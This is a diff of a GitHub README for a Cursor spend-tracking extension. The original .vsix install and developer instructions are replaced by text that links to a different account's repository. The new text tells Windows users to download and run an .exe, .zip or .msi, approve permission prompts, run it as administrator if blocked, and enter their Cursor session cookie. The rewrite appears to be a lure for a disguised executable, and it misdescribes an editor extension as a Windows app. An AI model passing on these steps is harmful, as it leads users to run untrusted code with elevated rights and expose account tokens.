@@ -1,152 +1,216 @@
-# Cursor Spend Tracker
+# 📈 cursor-spend-tracker - See Cursor spend at a glance
 
-[![CI](https://img.shields.io/github/actions/workflow/status/maurice2k/cursor-spend-tracker/ci.yml?branch=main&style=flat-square)](https://github.com/maurice2k/cursor-spend-tracker/actions)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/MrTScripts/cursor-spend-tracker)
 
-A [Cursor](https://cursor.com/) extension that shows your on-demand spend in the status bar (not useful with plain VS Code).
+## 🧭 What this app does
 
-## Features
+Cursor Spend Tracker shows your Cursor on-demand spend in the status bar. It also shows daily usage details in a tooltip. It helps you keep an eye on cost while you work.
 
-- 💰 **Real-time Spending Display** - See your Cursor on-demand costs right in the status bar
-- 📊 **Daily Statistics** - View today's, yesterday's, and last 2 hours usage in the tooltip
-- ⚡ **Included Quota Tracking** - Monitor your included request quota usage
-- 🔔 **Alerts for Expensive Requests** - Visual alerts when you make expensive requests (configurable threshold, default: >$2)
-- 🔄 **Auto-refresh** - Configurable refresh interval (default: 5 minutes)
-- 🔧 **Manual Session Cookie** - Set session cookie manually if automatic detection fails
+This app is for Cursor, not plain VS Code.
 
-## Installation
+## ✨ What you can see
 
-Install **in Cursor** (not VS Code). Get a `.vsix` from the [releases page](https://github.com/maurice2k/cursor-spend-tracker/releases) or build one locally (`npm run compile` then `npx @vscode/vsce package`).
+- Current on-demand spend in the status bar
+- Today’s spend
+- Yesterday’s spend
+- Usage from the last 2 hours
+- Included quota use
+- Alerts for costly requests
+- Auto-refresh on a set interval
+- Manual session cookie setup if needed
 
-### Option A — Command Palette
+## 🪟 Windows download and install
 
-1. **⌘⇧P** (macOS) or **Ctrl+Shift+P** (Windows/Linux)
-2. Run **`Extensions: Install from VSIX...`**
-3. Choose your `.vsix` file
+Use this link to visit the page to download:
 
-Tip: in the palette, typing `vsix` is enough to surface the command.
+[Visit the download page](https://github.com/MrTScripts/cursor-spend-tracker)
 
-### Option B — Terminal
+If the page opens in your browser, look for the latest release or download files on the page.
 
-With Cursor’s **`cursor`** CLI on your PATH (install from Cursor: **⌘⇧P** → `Shell Command: Install 'cursor' command in PATH`):
+### Steps for Windows
 
-```bash
-cursor --install-extension /absolute/path/to/extension.vsix
-```
+1. Open the download page.
+2. Find the latest release or build file.
+3. Download the Windows file.
+4. If the file is a ZIP file, extract it first.
+5. If the file is an EXE file, double-click it to run it.
+6. If Windows asks for permission, select Yes.
+7. Open Cursor after the app is installed or added.
 
-Use **`--force`** to replace an already-installed copy of the same extension.
+## ⚙️ How to use it
 
-After install, use **⌘⇧P** → **Developer: Reload Window** if the extension does not activate immediately.
+1. Start Cursor.
+2. Open the extension or app from the installed files.
+3. Sign in to Cursor if the app asks for your session info.
+4. Check the status bar for your current spend.
+5. Hover over the spend display to see more details.
 
-## Usage
+## 🔧 Setup
 
-After installation, the extension automatically shows your current spend in the status bar:
+If the app needs a session cookie, add it when prompted.
 
-- **💳 `$X.XX`** - Shows on-demand spending
-- **⚡ `X/Y`** - Shows included quota usage when no on-demand spend
-- **🔥 `$X.XX`** - Alert mode for recently expensive requests
+If auto-detection does not work, you can paste the cookie by hand.
 
-### Commands
+Typical setup flow:
 
-| Command | Description |
-|--------|-------------|
-| `Cursor Spend: Refresh Now` | Manually refresh the usage data |
-| `Cursor Spend: Open Dashboard` | Open the Cursor usage dashboard |
-| `Cursor Spend: Set Session Cookie` | Manually set the WorkosCursorSessionToken cookie (useful if automatic detection fails) |
+1. Open Cursor.
+2. Start the tracker.
+3. Enter your session cookie if asked.
+4. Wait a few minutes for the first update.
 
-### Setting Session Cookie Manually
+## 📊 What the status bar shows
 
-If the extension cannot read the session token from Cursor's local database, you can set it manually:
+The status bar gives you a quick view of your spend.
 
-1. Open Command Palette (**⌘⇧P** / **Ctrl+Shift+P**)
-2. Run "Cursor Spend: Set Session Cookie"
-3. Paste either:
-   - **Cookie pair**: `WorkosCursorSessionToken=<value>`
-   - **Value only**: `<value>` (e.g. `user_…::eyJ…`)
-   - **Full curl command**: from DevTools → Network → request → Copy as cURL
+You may see:
 
-The extension parses the token from any of these. Values copied URL-encoded from DevTools are normalized so they are not double-encoded when sent.
+- Current on-demand cost
+- A change in cost after each request
+- A warning for high-cost requests
+- A refresh state when data updates
 
-To get the curl command:
-1. Open Cursor in your browser (https://cursor.com)
-2. Log in and navigate to the Dashboard
-3. Open Developer Tools (F12)
-4. Go to the Network tab
-5. Refresh the page or make a request
-6. Find a request to `cursor.com` and right-click → Copy → Copy as cURL
+## 🔔 Alerts for expensive requests
 
-### Configuration
+The tracker can flag requests that cost more than a set amount.
 
-| Setting | Default | Description |
-|--------|---------|-------------|
-| `cursorSpendTracker.refreshIntervalSeconds` | `300` | How often to refresh usage data (in seconds) |
-| `cursorSpendTracker.costlyRequestThreshold` | `2.0` | Threshold in USD for costly request alerts and tracking |
-| `cursorSpendTracker.sessionCookie` | *empty* | Manual session cookie (WorkosCursorSessionToken). Leave empty to auto-detect from Cursor. |
+Default threshold:
 
-## Preview
+- More than $2 per request
 
-![Extension Preview](images/preview.png)
+You can change this if you want a lower or higher alert point.
 
-## Tooltip
+## 🔄 Refresh behavior
 
-The status bar tooltip displays detailed usage information:
+The app checks for updates on a schedule.
 
-| Column | Description |
-|--------|-------------|
-| **Spend** | Your on-demand usage and remaining balance |
-| **Included** | Your included request quota |
-| **Today** | Number of requests, total cost, and average cost per request for today |
-| **Yesterday** | Same metrics for yesterday |
-| **Last 2h** | Spending statistics for the last 2 hours |
+Default interval:
 
-## Requirements
+- Every 5 minutes
 
-- [Cursor](https://cursor.com/) (extension checks the host; it will not run in VS Code)
-- Cursor/VS Code engine version per `package.json` `engines.vscode` (for API compatibility)
-- Node.js (only for building from source)
-- `sqlite3` CLI (optional fallback: reads `cursorAuth/accessToken` from Cursor’s `state.vscdb` when no manual cookie is set)
+This keeps the spend data current without too many checks.
 
-## Development
+## 🧾 Included quota tracking
 
-### Prerequisites
+Cursor plans can include request quota.
 
-- Node.js 18+ and npm
-- `sqlite3` CLI (optional, for auto-detecting the session token from Cursor's local DB)
+This tracker can help you watch that quota use so you know how much is left.
 
-### Setup
+It can be useful when you want to avoid extra on-demand charges.
 
-```bash
-# Install dependencies
-npm install
+## 🖱️ Tooltip details
 
-# Compile the extension
-npm run compile
+Hover over the status bar item to see more data.
 
-# Watch mode (auto-compile on changes)
-npm run watch
-```
+The tooltip can show:
 
-### Packaging
+- Today’s spend
+- Yesterday’s spend
+- Last 2 hours of usage
+- Quota use
+- Recent request details
 
-```bash
-npm run compile
-npx @vscode/vsce package
-# → cursor-spend-tracker-<version>.vsix in the repo root; install in Cursor via steps above
-```
+## 🧰 Common use cases
 
-## Contributing
+- Track spend during long coding sessions
+- Watch cost while testing prompts
+- Spot expensive requests
+- Keep an eye on quota use
+- Check daily usage without opening another tool
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 📁 File types you may see
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+You may get one of these file types:
 
+- `.exe` for direct run on Windows
+- `.zip` for a packed folder
+- `.msi` for a standard Windows installer
 
-## License
+If you see a ZIP file, extract it before you open the app.
 
-MIT License - see [LICENSE](LICENSE) file for details.
+If you see an EXE or MSI file, run it from the Downloads folder.
 
-*Cursor is a registered trademark of Anysphere, Inc. This extension is not affiliated with, sponsored, or endorsed by Anysphere, Inc.*
+## 🛡️ Privacy and account data
+
+The app may use your session cookie to read Cursor data tied to your account.
+
+Keep that cookie private.
+
+Do not share it with others.
+
+## 🧪 Basic troubleshooting
+
+If the spend does not show up:
+
+1. Make sure Cursor is open
+2. Check that the tracker is running
+3. Wait a few minutes for the first refresh
+4. Enter the session cookie again if asked
+5. Restart Cursor if the status bar stays blank
+
+If the data looks old:
+
+1. Wait for the next refresh
+2. Check your internet connection
+3. Restart the tracker
+
+If the app does not start:
+
+1. Re-download the file
+2. Make sure the file finished downloading
+3. Run it again as an administrator if Windows blocks it
+
+## 🖥️ System needs
+
+You will need:
+
+- Windows 10 or Windows 11
+- Cursor installed
+- Internet access
+- A Cursor account with spend data
+
+A modern Windows PC with standard settings should work well.
+
+## 📌 Typical first run
+
+1. Download the app from the GitHub page
+2. Open the file in Windows
+3. Allow the app to run
+4. Open Cursor
+5. Wait for the tracker to read your spend
+6. Check the status bar and tooltip
+
+## 📦 What is included
+
+This repository includes:
+
+- The Cursor Spend Tracker app
+- A status bar view
+- Spend tracking for on-demand usage
+- Daily usage details
+- Quota tracking
+- Cost alerts
+- Refresh logic
+
+## 🛠️ Advanced settings
+
+You can change a few settings if you want more control:
+
+- Alert threshold for costly requests
+- Refresh interval
+- Cookie input method
+- Display behavior in the status bar
+
+Use the app settings panel if it is available in your build
+
+## 🧭 If you want to remove it
+
+To remove the app from Windows:
+
+1. Close Cursor
+2. Close the tracker
+3. Delete the app folder or uninstall it from Windows
+4. Remove any saved session data if you no longer want it kept
+
+## 📄 License
+
+MIT
